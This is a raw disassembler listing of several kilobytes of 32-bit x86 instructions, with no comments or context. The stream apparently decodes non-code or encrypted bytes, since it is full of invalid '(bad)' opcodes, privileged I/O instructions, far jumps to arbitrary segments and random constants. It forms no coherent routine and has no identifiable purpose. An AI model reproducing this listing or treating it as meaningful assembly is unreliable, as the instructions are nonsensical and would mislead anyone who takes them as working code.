  43eea8:	test   DWORD PTR [esi-0x4259b36b],0x7e7f92ba
  43eeb2:	int    0x46
  43eeb4:	sbb    al,0xc7
  43eeb6:	pop    ecx
  43eeb7:	mov    esi,cs
  43eeb9:	pop    ss
  43eeba:	adc    BYTE PTR [eax+ebx*4],dh
  43eebd:	into   
  43eebe:	outs   dx,BYTE PTR ds:[esi]
  43eebf:	aas    
  43eec0:	ins    BYTE PTR es:[edi],dx
  43eec1:	ret    0xce7
  43eec4:	gs mov esi,0xd6bad483
  43eeca:	jp     0x43ef14
  43eecc:	push   edx
  43eecd:	fst    QWORD PTR [ecx]
  43eecf:	out    dx,eax
  43eed0:	add    eax,0x9c8378d7
  43eed5:	mov    cl,0x36
  43eed7:	xchg   esi,eax
  43eed8:	sbb    eax,0x216f6c8a
  43eedd:	cwde   
  43eede:	jnp    0x43eec9
  43eee0:	xor    eax,0xc1374f71
  43eee5:	jmp    0xc5f81a37
  43eeea:	das    
  43eeeb:	es retf 0x73d3
  43eeef:	mov    al,fs:0x64a01500
  43eef5:	test   BYTE PTR [ecx+ebx*2],dl
  43eef8:	mov    ch,0x8a
  43eefa:	outs   dx,DWORD PTR ds:[esi]
  43eefb:	jns    0x43eefd
  43eefd:	stos   BYTE PTR es:[edi],al
  43eefe:	and    DWORD PTR [edx-0x3a],edx
  43ef01:	cmp    DWORD PTR [edi],esi
  43ef03:	pop    ecx
  43ef04:	add    dh,bl
  43ef06:	mov    ebp,0xaa17d1e9
  43ef0b:	push   ecx
  43ef0c:	jmp    0xe77bc995
  43ef11:	jae    0x43eef6
  43ef13:	ss adc eax,0xb236b4fa
  43ef19:	push   0xffffffac
  43ef1b:	stos   DWORD PTR es:[edi],eax
  43ef1c:	loop   0x43ee9e
  43ef1e:	xor    al,0x74
  43ef20:	jne    0x43ef0e
  43ef22:	pop    esp
  43ef23:	mov    eax,ds:0xc1c5e6a1
  43ef28:	sub    DWORD PTR [edi-0x48],edi
  43ef2b:	add    ah,BYTE PTR ds:0x4c4cc27a
  43ef31:	shl    edx,1
  43ef33:	aaa    
  43ef34:	lea    esi,[esi-0x54b7850d]
  43ef3a:	xor    ch,BYTE PTR [ebp+0x42]
  43ef3d:	adc    al,0x8f
  43ef3f:	(bad)  
  43ef40:	push   ss
  43ef41:	mov    ah,0x0
  43ef43:	je     0x43eee3
  43ef45:	or     DWORD PTR [si+0x2e],edi
  43ef49:	mov    ah,0xfe
  43ef4b:	cmp    ecx,esp
  43ef4d:	and    al,0x16
  43ef4f:	js     0x43ef18
  43ef51:	xor    BYTE PTR [ebx+ebp*1-0x42],0xab
  43ef56:	and    DWORD PTR [edi+0x7faa82f5],esp
  43ef5c:	cwde   
  43ef5d:	dec    ebx
  43ef5e:	neg    BYTE PTR [ebx+0x51]
  43ef61:	and    DWORD PTR [edx-0x1f],0x7
  43ef65:	and    edx,DWORD PTR [ebx]
  43ef67:	imul   edx,DWORD PTR [edi+0x32],0xbd55a1d2
  43ef6e:	xlat   BYTE PTR ds:[ebx]
  43ef6f:	clc    
  43ef70:	(bad)  
  43ef71:	cli    
  43ef72:	pandn  mm3,QWORD PTR [edx+0x7f]
  43ef76:	jmp    0x43ef4a
  43ef78:	adc    eax,0x96774af7
  43ef7d:	xor    al,0x77
  43ef7f:	loope  0x43ef91
  43ef81:	and    BYTE PTR [ebx],dl
  43ef83:	mov    ds:0xc2243df4,eax
  43ef88:	lahf   
  43ef89:	mov    edx,0x822ee246
  43ef8e:	mul    DWORD PTR [ebx-0x1b135a5a]
  43ef94:	push   edx
  43ef95:	pop    ebp
  43ef96:	scas   eax,DWORD PTR es:[edi]
  43ef97:	or     ch,BYTE PTR [ebx]
  43ef99:	cwde   
  43ef9a:	in     eax,dx
  43ef9b:	push   esi
  43ef9c:	icebp  
  43ef9d:	std    
  43ef9e:	pop    esp
  43ef9f:	lds    eax,FWORD PTR [ebx]
  43efa1:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43efa3:	pop    ecx
  43efa4:	aas    
  43efa5:	pop    edx
  43efa6:	out    0xd4,eax
  43efa8:	ins    DWORD PTR es:[edi],dx
  43efa9:	fisttp QWORD PTR ds:0xf3f30d7f
  43efaf:	imul   ecx,DWORD PTR [ebx+eax*1],0x7413b852
  43efb6:	icebp  
  43efb7:	and    bl,al
  43efb9:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  43efbb:	clc    
  43efbc:	(bad)  
  43efbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43efbe:	pop    esi
  43efbf:	ret    0x1c5c
  43efc2:	arpl   WORD PTR [ebp*1-0x22e27432],si
  43efc9:	mov    DWORD PTR [esi+0x14],ecx
  43efcc:	mov    al,0xf2
  43efce:	dec    edi
  43efcf:	push   ss
  43efd0:	inc    edx
  43efd1:	inc    edi
  43efd2:	add    eax,DWORD PTR [ebx]
  43efd4:	leave  
  43efd5:	push   edi
  43efd6:	mov    dl,0xf5
  43efd8:	xchg   edx,eax
  43efd9:	test   DWORD PTR [ecx],0x95da274f
  43efdf:	cmp    al,0xff
  43efe1:	rol    BYTE PTR [esi],cl
  43efe3:	inc    esi
  43efe4:	jno    0x43efdd
  43efe6:	jns    0x43efe0
  43efe8:	mov    ebx,DWORD PTR [ebx+edi*1+0x4f670c8d]
  43efef:	mov    cs,WORD PTR [ebp+0x63]
  43eff2:	jnp    0x43ef98
  43eff4:	add    al,0xb0
  43eff6:	dec    edi
  43eff7:	(bad)  
  43eff8:	fistp  DWORD PTR [esi+ebp*1]
  43effb:	rcr    ah,1
  43effd:	xchg   ebp,eax
  43effe:	mov    cs,WORD PTR [ecx]
  43f000:	dec    ebp
  43f001:	pop    eax
  43f002:	fcomp  QWORD PTR [eax+ebp*8+0xccacf7f]
  43f009:	dec    ebp
  43f00a:	mov    ds:0xdb6dd1a0,al
  43f00f:	movsx  edx,WORD PTR es:[edx]
  43f013:	mov    ah,0x1a
  43f015:	inc    edx
  43f016:	mov    eax,0x784a3554
  43f01b:	dec    ecx
  43f01c:	jge    0x43f031
  43f01e:	aam    0x21
  43f020:	fild   WORD PTR [esi+0x11]
  43f023:	outs   dx,DWORD PTR ds:[esi]
  43f024:	sub    ch,BYTE PTR gs:0x74a98131
  43f02b:	adc    esp,eax
  43f02d:	sub    al,0x77
  43f02f:	push   edx
  43f030:	fs cmp al,0x2e
  43f033:	inc    esi
  43f034:	outs   dx,BYTE PTR ds:[esi]
  43f035:	or     BYTE PTR [ebp-0x4c01b415],bh
  43f03b:	(bad)  
  43f03c:	stos   BYTE PTR es:[edi],al
  43f03d:	rol    BYTE PTR [edx+0x7e],0x4a
  43f041:	inc    edx
  43f042:	fidiv  WORD PTR [eax]
  43f044:	cmp    DWORD PTR [edx-0x14a69356],ebx
  43f04a:	pushf  
  43f04b:	pop    ebx
  43f04c:	push   0xffffff8d
  43f04e:	iret   
  43f04f:	xchg   BYTE PTR [ebx+0xd],cl
  43f052:	cmp    eax,0x8c73b4ab
  43f057:	pop    ss
  43f058:	mov    ecx,0x96b394c
  43f05d:	cmp    ebp,ebp
  43f05f:	aaa    
  43f060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f061:	mov    dh,BYTE PTR [esi-0x24]
  43f064:	hlt    
  43f065:	xchg   ebx,eax
  43f066:	xor    eax,0xe774ce62
  43f06b:	push   ds
  43f06c:	cmp    DWORD PTR [esp+esi*4+0x3b],ebp
  43f070:	hlt    
  43f071:	sbb    eax,0xab403397
  43f076:	pushf  
  43f077:	cmc    
  43f078:	add    eax,0x43eb2c8
  43f07d:	mov    ebp,0x2e334817
  43f082:	test   BYTE PTR ss:[ecx+ebx*1+0x122593a7],ch
  43f08a:	fsub   QWORD PTR [eax]
  43f08c:	mov    ch,0xce
  43f08f:	das    
  43f090:	mov    bh,0x55
  43f092:	pop    ss
  43f093:	mov    ah,0xdc
  43f095:	bound  ebp,QWORD PTR [edi-0x65]
  43f098:	fs (bad) 
  43f09a:	fiadd  WORD PTR [ebp-0x33]
  43f09d:	inc    edx
  43f09e:	sbb    DWORD PTR [eax-0x39],ecx
  43f0a1:	sbb    esi,esi
  43f0a3:	loopne 0x43f0bf
  43f0a5:	dec    eax
  43f0a6:	or     al,0x67
  43f0a8:	icebp  
  43f0a9:	add    al,0x65
  43f0ab:	jns    0x43f10f
  43f0ad:	jmp    0x2893:0x90675087
  43f0b4:	jne    0x43f0da
  43f0b6:	sbb    eax,0x2ec6b708
  43f0bb:	adc    DWORD PTR ds:0x9a71bff7,ecx
  43f0c1:	dec    edx
  43f0c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f0c3:	ss (bad) 
  43f0c6:	adc    edi,DWORD PTR [eax+0x47df7f16]
  43f0cc:	into   
  43f0cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f0ce:	pop    ebx
  43f0cf:	retf   0x5734
  43f0d2:	ins    DWORD PTR es:[edi],dx
  43f0d3:	and    bl,BYTE PTR [edi+0xc50be33]
  43f0d9:	rcl    BYTE PTR ds:0x4e914914,cl
  43f0df:	xchg   ebx,eax
  43f0e0:	(bad)  
  43f0e1:	sbb    ebp,DWORD PTR [edx+eiz*8+0x6d]
  43f0e5:	xchg   esi,eax
  43f0e6:	sbb    ch,BYTE PTR [edx+esi*4+0x28d5cfca]
  43f0ed:	and    edi,DWORD PTR [eax-0x4e]
  43f0f0:	add    al,0x5a
  43f0f2:	adc    esp,DWORD PTR [eax+0x19]
  43f0f5:	shl    DWORD PTR ds:0xc589915f,0x9
  43f0fc:	push   edi
  43f0fd:	mov    ecx,0xb41a36ea
  43f102:	push   edi
  43f103:	es (bad) 
  43f105:	pop    esp
  43f106:	push   ecx
  43f107:	(bad)  
  43f108:	cdq    
  43f109:	adc    BYTE PTR [ebx],0x4
  43f10c:	sbb    al,0x2b
  43f10e:	bound  ebp,QWORD PTR [esi+edi*4]
  43f111:	sub    ebp,DWORD PTR [esi+0x35fe8b3d]
  43f117:	mov    al,ds:0xfa8427f2
  43f11c:	jmp    0xf34b:0xe22cee1b
  43f123:	iret   
  43f124:	into   
  43f125:	fist   DWORD PTR [esi+0x1fc83ac4]
  43f12b:	sub    eax,0x660eb12e
  43f130:	jb     0x43f1aa
  43f132:	push   edi
  43f133:	push   esp
  43f134:	lods   eax,DWORD PTR ds:[esi]
  43f135:	dec    edx
  43f136:	push   ecx
  43f137:	pusha  
  43f138:	cmp    eax,0x1cf0dfa6
  43f13d:	aad    0x21
  43f13f:	pusha  
  43f140:	and    esp,DWORD PTR [edx-0x6a1bb867]
  43f146:	retf   0x2b3e
  43f149:	test   DWORD PTR [edi],ebp
  43f14b:	(bad)  
  43f14d:	retf   
  43f14e:	xor    BYTE PTR [eax+edx*2],ch
  43f151:	push   eax
  43f152:	or     ecx,DWORD PTR [ebp-0x7d]
  43f155:	stos   BYTE PTR es:[edi],al
  43f156:	outs   dx,BYTE PTR ds:[esi]
  43f157:	cdq    
  43f158:	lods   eax,DWORD PTR ds:[esi]
  43f159:	pushf  
  43f15a:	sub    ah,0xfd
  43f15d:	aam    0x6a
  43f15f:	frstor [esi]
  43f161:	cmc    
  43f162:	into   
  43f163:	fdivr  DWORD PTR [edi]
  43f165:	mov    dh,0xd5
  43f167:	sub    eax,0x40116ff2
  43f16c:	push   esp
  43f16d:	(bad)  
  43f16e:	aas    
  43f16f:	(bad)  
  43f170:	mov    al,0x37
  43f172:	in     al,0xef
  43f174:	call   0xff3:0x7d2fcfb1
  43f17b:	push   esp
  43f17c:	outs   dx,BYTE PTR ds:[esi]
  43f17d:	icebp  
  43f17e:	mov    ebx,0x9e254915
  43f183:	call   0xc462f2a0
  43f188:	ins    DWORD PTR es:[edi],dx
  43f189:	push   ecx
  43f18a:	loopne 0x43f17a
  43f18c:	inc    ebp
  43f18d:	xor    BYTE PTR [ebx],0xd8
  43f190:	(bad)  
  43f191:	iret   
  43f192:	cwde   
  43f193:	clc    
  43f194:	sar    BYTE PTR [esp+ecx*8+0x49ff1967],0x12
  43f19c:	sub    BYTE PTR [edi-0x13],dh
  43f19f:	test   esi,edx
  43f1a1:	dec    ebp
  43f1a2:	cmp    al,0x14
  43f1a4:	cmp    ecx,DWORD PTR [edx+0x2f]
  43f1a7:	mov    ebx,0x5b02db7a
  43f1ac:	in     eax,dx
  43f1ad:	xchg   DWORD PTR [edx+0x7f],edi
  43f1b0:	je     0x43f1bf
  43f1b2:	sub    ebp,DWORD PTR [ebx]
  43f1b4:	repz rol dh,1
  43f1b7:	xchg   DWORD PTR [ebx],eax
  43f1b9:	ss inc ebx
  43f1bb:	test   al,0xff
  43f1bd:	dec    ecx
  43f1be:	pop    esp
  43f1bf:	push   cs
  43f1c0:	outs   dx,DWORD PTR ds:[esi]
  43f1c1:	push   edi
  43f1c2:	in     eax,dx
  43f1c3:	and    DWORD PTR [eax+0x7c03be59],ebx
  43f1c9:	cdq    
  43f1ca:	not    DWORD PTR [ecx-0x21]
  43f1cd:	in     al,dx
  43f1ce:	(bad)  
  43f1cf:	push   edi
  43f1d0:	ins    BYTE PTR es:[edi],dx
  43f1d1:	xor    cl,BYTE PTR [ecx+0xe]
  43f1d4:	aad    0x78
  43f1d6:	dec    eax
  43f1d7:	cld    
  43f1d8:	xchg   ebx,eax
  43f1d9:	sub    BYTE PTR [ebx],0x82
  43f1dc:	(bad)  
  43f1dd:	nop
  43f1de:	loop   0x43f1ad
  43f1e0:	push   edi
  43f1e1:	push   es
  43f1e2:	imul   edi,edi,0xd8c580c6
  43f1e8:	lock mov eax,0x835105fb
  43f1ee:	icebp  
  43f1ef:	add    BYTE PTR [ebx-0x60],0x9e
  43f1f3:	inc    ecx
  43f1f4:	imul   esp,DWORD PTR [ebp+0x55e60f66],0xffffffb9
  43f1fb:	cli    
  43f1fc:	push   esp
  43f1fd:	sahf   
  43f1fe:	and    al,0xe5
  43f200:	fstp   QWORD PTR [esi]
  43f202:	call   0x77836093
  43f207:	cmp    dl,ch
  43f209:	or     esi,DWORD PTR [ecx+0x6d]
  43f20c:	mov    ?,ebp
  43f20e:	outs   dx,DWORD PTR ds:[esi]
  43f20f:	call   0x7080696d
  43f214:	popw   ss
  43f216:	mov    dl,0x11
  43f218:	push   cs
  43f219:	mov    esi,DWORD PTR [edi-0x2d]
  43f21c:	inc    ecx
  43f21d:	adc    BYTE PTR [eax],ch
  43f21f:	(bad)  
  43f220:	(bad)  
  43f221:	nop
  43f222:	dec    edx
  43f223:	fbstp  TBYTE PTR [ebx+0x3b]
  43f226:	adc    edi,DWORD PTR [edx+0x745387f8]
  43f22c:	xchg   edx,eax
  43f22d:	mov    esi,0x3d88e561
  43f232:	mov    esi,0xa9f0d177
  43f237:	xchg   esp,eax
  43f238:	fisttp WORD PTR [esi-0x7ae3a698]
  43f23e:	(bad)  
  43f23f:	(bad)  
  43f240:	test   al,0xc4
  43f242:	cwde   
  43f243:	xchg   ecx,eax
  43f244:	xchg   ebx,eax
  43f245:	xchg   edx,eax
  43f246:	jmp    0x43f209
  43f248:	cmp    edi,DWORD PTR [eax-0x5b]
  43f24b:	ss loop 0x43f288
  43f24e:	xor    al,0x6f
  43f250:	test   al,ah
  43f252:	sub    ah,dh
  43f254:	in     eax,0xc0
  43f256:	scas   al,BYTE PTR es:[edi]
  43f257:	sub    edx,edi
  43f259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f25a:	aam    0x4e
  43f25c:	(bad)  
  43f25d:	mov    edx,DWORD PTR [edi]
  43f25f:	or     al,0x96
  43f261:	mov    edi,0xe057982d
  43f266:	inc    ecx
  43f267:	push   ecx
  43f268:	sbb    BYTE PTR [ebx],ah
  43f26a:	jb     0x43f2dc
  43f26c:	adc    dl,BYTE PTR [ebx-0x76553033]
  43f272:	add    BYTE PTR [edi-0x6a],ah
  43f275:	ret    0x2da3
  43f278:	inc    eax
  43f279:	cmp    DWORD PTR [edi],esi
  43f27b:	xchg   edi,eax
  43f27c:	(bad)  
  43f27d:	sub    al,0x98
  43f27f:	in     al,0x28
  43f281:	mov    eax,ds:0x2d8525d2
  43f286:	fiadd  WORD PTR [eax-0x7109cc9c]
  43f28c:	inc    ecx
  43f28d:	dec    esp
  43f28e:	jne    0x43f30f
  43f290:	mov    bl,BYTE PTR [esi]
  43f292:	push   ebp
  43f293:	or     eax,0x2b28cbc9
  43f298:	push   ebx
  43f299:	repz xor al,0xf0
  43f29c:	fldcw  WORD PTR [esi+edi*4]
  43f29f:	mov    gs,WORD PTR [edx-0x55ec0b02]
  43f2a5:	inc    edx
  43f2a6:	mov    bl,BYTE PTR [ecx+0x71baf655]
  43f2ac:	jle    0x43f233
  43f2ae:	(bad)  
  43f2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f2b0:	outs   dx,DWORD PTR ds:[esi]
  43f2b1:	fisttp QWORD PTR [eax+ebp*2]
  43f2b4:	repz call 0x76cd204e
  43f2ba:	fwait
  43f2bb:	int3   
  43f2bc:	inc    esi
  43f2bd:	call   FWORD PTR [esi+0x78]
  43f2c0:	push   eax
  43f2c1:	out    0xa5,eax
  43f2c3:	imul   esi,DWORD PTR [eax+0x317a1718],0xffffff92
  43f2ca:	pushf  
  43f2cb:	inc    ecx
  43f2cc:	loope  0x43f288
  43f2ce:	leave  
  43f2cf:	xchg   DWORD PTR [ebp+0xd],ebx
  43f2d2:	daa    
  43f2d3:	push   ds
  43f2d4:	jb     0x43f2f5
  43f2d6:	clc    
  43f2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f2d8:	gs xor bh,0xd9
  43f2dc:	pop    ebp
  43f2dd:	jb     0x43f289
  43f2df:	xchg   edi,eax
  43f2e0:	jp     0x43f308
  43f2e2:	jnp    0x43f32c
  43f2e4:	(bad)  
  43f2e5:	aaa    
  43f2e6:	xchg   esi,eax
  43f2e7:	dec    ecx
  43f2e8:	out    0xfb,eax
  43f2ea:	push   esi
  43f2eb:	mov    ah,0xad
  43f2ed:	mov    BYTE PTR [eax+ebx*8-0x2f9f02d8],ch
  43f2f4:	je     0x43f2f6
  43f2f6:	dec    ebp
  43f2f7:	mov    dh,0x1a
  43f2f9:	jmp    0x9a27:0x2d3c1194
  43f300:	add    BYTE PTR [edi+0x37],dh
  43f303:	push   ebp
  43f304:	push   esi
  43f305:	test   BYTE PTR [esi+edx*2],ah
  43f308:	xchg   ebx,eax
  43f309:	les    eax,FWORD PTR [edi+ecx*1+0x7]
  43f30d:	sub    edx,0x7436fc09
  43f313:	stos   DWORD PTR es:[edi],eax
  43f314:	and    cl,ah
  43f316:	ins    DWORD PTR es:[edi],dx
  43f317:	fwait
  43f318:	cli    
  43f319:	mov    eax,0xb7d73a6e
  43f31e:	pop    ss
  43f31f:	loopne 0x43f2c9
  43f321:	jmp    0x1db85639
  43f326:	mov    ch,0x34
  43f328:	addr16 enter 0x8b2e,0x69
  43f32d:	xor    ch,al
  43f32f:	add    al,0x44
  43f331:	xor    ah,dh
  43f333:	into   
  43f334:	add    BYTE PTR [ebx+ebp*8+0x46],0x31
  43f339:	bound  ecx,QWORD PTR [ebx+0x9]
  43f33c:	xchg   ebx,eax
  43f33d:	ins    BYTE PTR es:[edi],dx
  43f33e:	das    
  43f33f:	outs   dx,DWORD PTR ds:[esi]
  43f340:	pop    eax
  43f341:	push   ss
  43f342:	aad    0x6e
  43f344:	xchg   DWORD PTR [ecx+0x2c],edi
  43f347:	jns    0x43f369
  43f349:	dec    edi
  43f34a:	call   0x6d71:0x670cb0b1
  43f351:	xchg   edx,eax
  43f352:	mov    esi,0x9186133e
  43f357:	int3   
  43f358:	(bad)  
  43f359:	sti    
  43f35a:	ja     0x43f37b
  43f35c:	cmp    BYTE PTR [edi-0x7b9110cb],dl
  43f362:	sbb    eax,0xb3f7bb6a
  43f367:	dec    BYTE PTR [eax]
  43f369:	mov    gs,WORD PTR ds:0x147869c1
  43f36f:	fwait
  43f370:	(bad)  
  43f371:	sbb    ecx,DWORD PTR [ebx+0x5d5ccd9f]
  43f377:	sbb    eax,0x17f4ebcd
  43f37c:	out    dx,al
  43f37d:	push   ecx
  43f37e:	add    eax,0xc0584194
  43f383:	popf   
  43f384:	or     BYTE PTR fs:[esi],al
  43f387:	mov    al,ds:0x684ae8b2
  43f38c:	fcmovu st,st(2)
  43f38e:	xchg   BYTE PTR [esp+0x7dd812e],cl
  43f395:	test   DWORD PTR [edi-0x80],edi
  43f398:	leave  
  43f399:	cdq    
  43f39a:	nop
  43f39b:	sbb    ebx,0x7f
  43f39e:	fidiv  DWORD PTR [esi-0x6d]
  43f3a1:	mov    edi,0x3a011e38
  43f3a6:	(bad)  
  43f3a7:	xchg   ebx,eax
  43f3a8:	xchg   edx,eax
  43f3a9:	ja     0x43f3a8
  43f3ab:	xchg   ebx,eax
  43f3ac:	out    0xae,eax
  43f3ae:	mov    DWORD PTR [ebx],esp
  43f3b0:	icebp  
  43f3b1:	dec    edx
  43f3b2:	(bad)  
  43f3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f3b4:	pop    esp
  43f3b5:	int3   
  43f3b6:	push   ss
  43f3b7:	xchg   ebp,eax
  43f3b8:	jp     0x43f3b8
  43f3ba:	pop    edx
  43f3bb:	stos   BYTE PTR es:[edi],al
  43f3bc:	jmp    0xe8a8712
  43f3c1:	inc    ecx
  43f3c2:	cmp    BYTE PTR [eax-0x493b3fee],al
  43f3c8:	rcr    DWORD PTR [ebx],0xb2
  43f3cb:	sub    al,0x28
  43f3cd:	lds    edx,FWORD PTR [eax]
  43f3cf:	inc    ebx
  43f3d0:	sub    esp,DWORD PTR [ecx-0x3f]
  43f3d3:	xchg   ebp,eax
  43f3d4:	mov    al,ds:0x8cf5e4c1
  43f3d9:	addr16 pop ss
  43f3db:	aam    0xd0
  43f3dd:	fs jns 0x43f372
  43f3e0:	jo     0x43f3f3
  43f3e2:	les    ebx,FWORD PTR [edi]
  43f3e4:	vpmulhuw xmm5,xmm3,XMMWORD PTR [edi+eax*4+0x1b]
  43f3ea:	push   eax
  43f3eb:	dec    edx
  43f3ec:	cmc    
  43f3ed:	jge    0x43f3a6
  43f3ef:	pusha  
  43f3f0:	add    bl,dl
  43f3f2:	adc    ch,BYTE PTR [ecx+0x1b]
  43f3f5:	cmp    al,0x94
  43f3f7:	and    eax,DWORD PTR [ebp+0x6558ddf2]
  43f3fd:	mov    ah,0x1d
  43f3ff:	inc    edi
  43f400:	aam    0xc4
  43f402:	test   DWORD PTR [edi+0x7ead8699],esp
  43f408:	inc    esi
  43f409:	les    eax,FWORD PTR [ebp-0xe2e1059]
  43f40f:	add    eax,DWORD PTR ds:0x69926f1b
  43f416:	sbb    ebx,ebp
  43f418:	jo     0x43f42b
  43f41a:	dec    esp
  43f41b:	dec    ebx
  43f41c:	out    0xc4,al
  43f41e:	fsub   st(1),st
  43f420:	cmp    BYTE PTR [eax-0x36],dl
  43f423:	dec    edi
  43f424:	aad    0x54
  43f426:	mov    edx,0xd0771fd4
  43f42b:	push   cs
  43f42c:	test   eax,0xdb62d20e
  43f431:	stos   DWORD PTR es:[edi],eax
  43f432:	and    eax,0x9c8f161d
  43f437:	fbld   TBYTE PTR [esi]
  43f439:	retf   0x8244
  43f43c:	ins    DWORD PTR es:[edi],dx
  43f43d:	push   ebp
  43f43e:	mov    esp,0x28d4fdbd
  43f443:	push   0xffffff95
  43f445:	pop    ebp
  43f446:	mov    ah,BYTE PTR [edx+edx*1]
  43f449:	sti    
  43f44a:	stos   BYTE PTR es:[edi],al
  43f44b:	cmp    cl,dh
  43f44d:	mov    eax,ds:0x19de04c6
  43f452:	jge    0x43f4c1
  43f454:	or     esp,DWORD PTR [ebx]
  43f456:	es mov ch,0x82
  43f459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f45a:	jmp    0x26596c9b
  43f45f:	jno    0x43f48c
  43f461:	xchg   esp,eax
  43f462:	ins    BYTE PTR es:[edi],dx
  43f463:	and    esi,DWORD PTR [ebx]
  43f465:	enter  0x4e9e,0xbb
  43f469:	popf   
  43f46a:	lahf   
  43f46b:	push   ss
  43f46c:	xchg   ebp,eax
  43f46d:	sub    eax,0xa60a8849
  43f472:	imul   ecx,esi,0x61
  43f475:	jg     0x43f442
  43f477:	repnz pop es
  43f479:	jecxz  0x43f43c
  43f47b:	in     al,dx
  43f47c:	sbb    DWORD PTR [esi+eax*2],0xfffffffa
  43f480:	push   ss
  43f481:	imul   ecx,DWORD PTR [edi-0x42],0xce2abdca
  43f488:	or     eax,0x9dfb342a
  43f48d:	dec    edx
  43f48e:	imul   ecx,DWORD PTR [edx-0x4349226],0x77
  43f495:	in     eax,0x15
  43f497:	pop    edx
  43f498:	daa    
  43f499:	xchg   ebp,eax
  43f49a:	pop    es
  43f49b:	ins    BYTE PTR es:[edi],dx
  43f49c:	lea    ebp,[ebx-0x47]
  43f49f:	push   es
  43f4a0:	fnstcw WORD PTR [esi+edi*2+0x47]
  43f4a4:	clc    
  43f4a5:	ds adc eax,eax
  43f4a8:	repnz cli 
  43f4aa:	ds sub al,0x68
  43f4ad:	jge    0x43f47d
  43f4af:	retf   0x4892
  43f4b2:	outs   dx,BYTE PTR ds:[esi]
  43f4b3:	pop    eax
  43f4b4:	fist   WORD PTR [edi]
  43f4b6:	dec    edx
  43f4b7:	enter  0x10e8,0x3d
  43f4bb:	adc    ebx,0xdde93793
  43f4c1:	stos   BYTE PTR es:[edi],al
  43f4c2:	ds nop
  43f4c4:	and    esp,DWORD PTR [edx]
  43f4c6:	rol    DWORD PTR [ebx-0x627dda8c],1
  43f4cc:	leave  
  43f4cd:	sbb    DWORD PTR [edi-0x5b274831],0x3a7c95ad
  43f4d7:	loope  0x43f4d8
  43f4d9:	ss xchg edx,eax
  43f4db:	xor    DWORD PTR [edi-0x6c249902],edx
  43f4e1:	test   al,0xf1
  43f4e3:	mov    ecx,0x72a4eb9c
  43f4e8:	rcl    BYTE PTR [eax-0x32c92245],1
  43f4ee:	xchg   DWORD PTR [ebp-0x59],edi
  43f4f1:	inc    eax
  43f4f2:	pop    si
  43f4f4:	sbb    BYTE PTR [ebp+0x6353dcbc],bl
  43f4fa:	cmovne esp,DWORD PTR [ebx]
  43f4fd:	jno    0x43f552
  43f4ff:	ss add eax,0x88d2cc33
  43f505:	out    dx,al
  43f506:	loopne 0x43f570
  43f508:	cmp    dl,BYTE PTR [edx]
  43f50a:	inc    ecx
  43f50b:	rcl    DWORD PTR [edx-0x56],cl
  43f50e:	pop    esp
  43f50f:	hlt    
  43f510:	hlt    
  43f511:	(bad)  
  43f513:	sar    DWORD PTR [eax],0x57
  43f516:	(bad)  
  43f517:	jg     0x43f4af
  43f519:	inc    ecx
  43f51a:	es icebp 
  43f51c:	push   ds
  43f51d:	push   ss
  43f51e:	jp     0x43f585
  43f520:	gs jmp 0x90a6:0xacfa15ae
  43f528:	sbb    eax,0xbd5eccd4
  43f52d:	or     BYTE PTR [edx+0x28e0f40c],dl
  43f533:	dec    ebp
  43f534:	(bad)  
  43f536:	shl    bh,cl
  43f538:	inc    esp
  43f539:	push   ds
  43f53a:	sub    DWORD PTR [eax-0x6b8cfc99],ebx
  43f540:	adc    DWORD PTR [eax+ebx*2],0xffffffcf
  43f544:	bound  edi,QWORD PTR [ebp-0x4d]
  43f547:	mov    WORD PTR [eax+ebx*8-0x6c],ds
  43f54b:	pop    esi
  43f54c:	sbb    DWORD PTR [edx+0x6e018d07],0x841f1834
  43f556:	jmp    0x291c97c5
  43f55b:	sub    BYTE PTR [esi-0x374cfb8d],al
  43f561:	mov    ds:0x99afe7eb,eax
  43f566:	fs sub ecx,0xa1b60f61
  43f56d:	clc    
  43f56e:	pop    es
  43f56f:	jmp    0xb0e6:0x4c9fde58
  43f576:	xchg   ebp,eax
  43f577:	mov    bl,0x5
  43f579:	fst    DWORD PTR [esi+edx*2]
  43f57c:	add    ecx,DWORD PTR [eax-0x7746d1f5]
  43f582:	mov    ebp,0xfabd5f65
  43f587:	shl    DWORD PTR [edi-0x34],cl
  43f58a:	lahf   
  43f58b:	fstp   TBYTE PTR [esi]
  43f58d:	in     al,0x5e
  43f58f:	push   ds
  43f590:	fbld   TBYTE PTR [edi]
  43f592:	mov    al,ds:0xa3b277e1
  43f597:	mov    WORD PTR [edi+0x4],fs
  43f59a:	dec    edi
  43f59b:	jns    0x43f592
  43f59d:	lock ret 
  43f59f:	xchg   DWORD PTR [eax+0x18],edi
  43f5a2:	cld    
  43f5a3:	iret   
  43f5a4:	retf   
  43f5a5:	xchg   edi,eax
  43f5a6:	sbb    eax,0xcc0d422
  43f5ab:	mov    al,ds:0x1c064d7f
  43f5b0:	out    dx,eax
  43f5b1:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  43f5b3:	arpl   WORD PTR [ebx-0xd7302c6],si
  43f5b9:	jae    0x43f580
  43f5bb:	fiadd  DWORD PTR [eax]
  43f5bd:	xor    esp,DWORD PTR [ebp-0x1d]
  43f5c0:	inc    eax
  43f5c1:	dec    edi
  43f5c2:	mov    bh,0x87
  43f5c4:	cdq    
  43f5c5:	add    al,0x87
  43f5c7:	aaa    
  43f5c8:	pop    edx
  43f5c9:	push   ds
  43f5ca:	je     0x43f567
  43f5cc:	clc    
  43f5cd:	xor    dh,BYTE PTR fs:0xbf608b6
  43f5d4:	mov    al,0x3f
  43f5d6:	das    
  43f5d7:	imul   esp,eax,0xb38885ea
  43f5dd:	mov    eax,0x9a46817
  43f5e2:	aas    
  43f5e3:	add    BYTE PTR [edx+edi*1-0x42c48b6a],dh
  43f5ea:	xor    bh,BYTE PTR [edx+0x6253686]
  43f5f0:	rcl    BYTE PTR [esi+0x5205a773],0xa7
  43f5f7:	cld    
